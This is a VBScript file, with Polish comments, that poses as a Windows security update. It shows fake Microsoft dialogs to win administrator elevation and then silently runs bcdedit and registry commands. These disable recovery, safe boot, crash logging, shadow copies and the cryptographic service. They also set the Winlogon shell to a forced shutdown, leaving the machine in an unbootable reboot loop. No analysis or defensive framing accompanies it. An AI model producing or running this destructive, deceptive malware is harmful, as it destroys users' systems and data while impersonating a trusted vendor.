Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Sprawdź czy uruchomione jako administrator
If Not objFSO.FileExists("C:\Windows\System32\config\system") Then
    MsgBox "Administrator privileges required for system update.", vbExclamation, "Access Denied"
    objShell.Run "powershell -Command Start-Process wscript.exe -ArgumentList '" & WScript.ScriptFullName & "' -Verb RunAs", 0, True
    WScript.Quit
End If

answer = MsgBox("Windows Security Update KB5007652" & vbCrLf & vbCrLf & _
                "This update patches critical vulnerabilities." & vbCrLf & _
                "Do you want to install now?", vbYesNo + vbQuestion, "Microsoft Update")

If answer = vbNo Then
    MsgBox "Update postponed. System may be at risk.", vbExclamation, "Warning"
    WScript.Quit
End If

MsgBox "Installing updates... Please wait.", vbInformation, "Windows Update"

' Zabij boot systemu
objShell.Run "cmd /c bcdedit /set {default} recoveryenabled no", 0, True
objShell.Run "cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", 0, True
objShell.Run "cmd /c bcdedit /deletevalue {default} safeboot", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" /v BootExecute /t REG_MULTI_SZ /d ""autocheck autochk * /k:C *"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\CrashControl"" /v CrashDumpEnabled /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\CrashControl"" /v LogEvent /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\VSS"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Shell /t REG_SZ /d ""cmd.exe /c shutdown /r /f /t 0"" /f", 0, True
objShell.Run "cmd /c shutdown /r /f /t 5", 0, True

MsgBox "Update complete. System will restart in 5 seconds.", vbInformation, "Success"
